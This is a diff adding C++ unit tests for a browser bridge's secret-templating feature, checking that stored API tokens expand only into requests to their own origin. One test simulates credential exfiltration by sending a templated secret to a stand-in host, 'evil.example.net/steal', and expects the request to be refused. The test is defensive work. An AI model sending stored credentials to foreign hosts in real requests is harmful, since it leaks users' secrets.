@@ -9,7 +9,15 @@
 #include <string_view>
 #include <utility>
 
+#include "base/test/bind.h"
 #include "base/values.h"
+#include "components/os_crypt/async/browser/test_utils.h"
+#include "components/prefs/pref_registry_simple.h"
+#include "components/prefs/testing_pref_service.h"
+#include "custom_browser/browser/nexus/api/llm/llm_pref_names.h"
+#include "custom_browser/browser/nexus/api/secrets/nexus_secret_store.h"
+#include "custom_browser/browser/nexus/nexus_secret_crypt.h"
+#include "services/network/public/cpp/resource_request.h"
 #include "content/public/test/browser_task_environment.h"
 #include "custom_browser/browser/nexus/nexus_bridge_response_delegate.h"
 #include "mojo/public/cpp/base/big_buffer.h"
@@ -158,6 +166,85 @@ TEST_F(NexusNetworkStreamTest, ClosingTheConnectionCancelsOpenStreams) {
   EXPECT_EQ(adapter_.stream_count_for_testing(), 1u);
   adapter_.OnBridgeConnectionClosed();
   EXPECT_EQ(adapter_.stream_count_for_testing(), 0u);
+}
+
+// {{secret:NAME}} goes into a request to the secret's own origin, and
+// nowhere else.
+class NexusNetworkSecretsTest : public NexusNetworkStreamTest {
+ protected:
+  NexusNetworkSecretsTest() {
+    prefs_.registry()->RegisterDictionaryPref(prefs::kNexusSecrets);
+    NexusSecretCrypt::GetInstance()->SetEncryptorForTesting(
+        os_crypt_async::GetTestEncryptorForTesting());
+    adapter_.SetPrefsForTesting(&prefs_);
+    EXPECT_FALSE(NexusSecretStore(&prefs_).Set(
+        "provider:acme", "tok-123", "https://api.example.com"));
+  }
+
+  TestingPrefServiceSimple prefs_;
+};
+
+TEST_F(NexusNetworkSecretsTest, ASecretReachesOnlyItsOrigin) {
+  std::string seen_auth;
+  GURL seen_url;
+  factory_.SetInterceptor(
+      base::BindLambdaForTesting([&](const network::ResourceRequest& request) {
+        seen_auth = request.headers.GetHeader("Authorization").value_or("");
+        seen_url = request.url;
+      }));
+
+  base::DictValue payload = OpenPayload("https://api.example.com/v1/run");
+  base::DictValue headers;
+  headers.Set("Authorization", "Bearer {{secret:provider:acme}}");
+  payload.Set("headers", std::move(headers));
+  base::DictValue query;
+  query.Set("key", "{{secret:provider:acme}}");
+  payload.Set("queryParams", std::move(query));
+  Dispatch("streamOpen", std::move(payload));
+  EXPECT_EQ(seen_auth, "Bearer tok-123");
+  EXPECT_EQ(seen_url.query(), "key=tok-123");
+
+  // Another origin: refused before anything is sent.
+  seen_auth.clear();
+  base::DictValue elsewhere = OpenPayload("https://evil.example.net/steal");
+  elsewhere.Set("streamId", "stream-0002");
+  base::DictValue evil_headers;
+  evil_headers.Set("Authorization", "Bearer {{secret:provider:acme}}");
+  elsewhere.Set("headers", std::move(evil_headers));
+  Dispatch("streamOpen", std::move(elsewhere));
+  EXPECT_EQ(delegate_.last_error_code, "SECRET_ORIGIN_MISMATCH");
+  EXPECT_TRUE(seen_auth.empty());
+}
+
+TEST_F(NexusNetworkSecretsTest, HttpRequestExpandsHeadersToo) {
+  std::string seen_key;
+  factory_.SetInterceptor(
+      base::BindLambdaForTesting([&](const network::ResourceRequest& request) {
+        seen_key = request.headers.GetHeader("X-Api-Key").value_or("");
+      }));
+  base::DictValue payload;
+  payload.Set("url", "https://api.example.com/v1/ping");
+  payload.Set("method", "POST");
+  base::ListValue body;
+  body.Append(1);  // see OpenPayload: an empty inline body needs a port
+  payload.Set("body", std::move(body));
+  base::DictValue headers;
+  headers.Set("X-Api-Key", "{{secret:provider:acme}}");
+  payload.Set("headers", std::move(headers));
+  Dispatch("httpRequest", std::move(payload));
+  EXPECT_EQ(seen_key, "tok-123");
+
+  base::DictValue missing;
+  missing.Set("url", "https://api.example.com/v1/ping");
+  missing.Set("method", "POST");
+  base::ListValue missing_body;
+  missing_body.Append(1);
+  missing.Set("body", std::move(missing_body));
+  base::DictValue missing_headers;
+  missing_headers.Set("X-Api-Key", "{{secret:provider:nope}}");
+  missing.Set("headers", std::move(missing_headers));
+  Dispatch("httpRequest", std::move(missing));
+  EXPECT_EQ(delegate_.last_error_code, "SECRET_UNAVAILABLE");
 }
 
 }  // namespace
